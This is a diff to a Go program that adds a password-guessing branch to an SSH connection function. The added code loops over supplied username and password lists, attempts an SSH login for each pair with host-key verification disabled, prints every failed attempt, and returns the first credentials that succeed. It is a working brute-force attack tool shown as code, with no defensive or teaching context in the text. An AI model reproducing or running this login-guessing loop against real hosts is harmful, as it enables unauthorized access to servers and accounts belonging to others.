@@ -1,12 +1,12 @@
 package main
 
 import (
-   "bufio"
+	"bufio"
     "log"
     "net"
     "os"
-    "golang.org/x/crypto/ssh"
-    "fmt"
+	"golang.org/x/crypto/ssh"
+	"fmt"
 )
 
 func IUsserPAss(ArgVar *ArgVar) ([]string, []string) {
@@ -109,6 +109,30 @@ func (ArgVar *ArgVar) SSHConnect()(string,string){
 	        	break
 	        }
    	    }   
-    }
+    }else if ArgVar.UserList != "" && ArgVar.PassList !=""{
+        fmt.Println("")
+    	UserList , PassList := IUsserPAss(ArgVar)
+    	for User := range UserList {
+    		for Pass := range PassList{
+    			SSHdial := &ssh.ClientConfig{
+		        User: UserList[User],
+	        	Auth: []ssh.AuthMethod{
+		    	    ssh.Password(PassList[Pass]),
+	        	},
+	            HostKeyCallback: ssh.InsecureIgnoreHostKey(),
+		        }
+		        _ , err := ssh.Dial("tcp", DomainNet , SSHdial)
+		        if err != nil {
+		        	fmt.Println("err" ,err , UserList[User],PassList[Pass])
+		        	continue
+		        }else{
+		        	return UserList[User]  ,PassList[Pass]
+		        	break
+		        }
+
+    		}
+    	}
+    		
+   	}   
     return "" ,""
 }
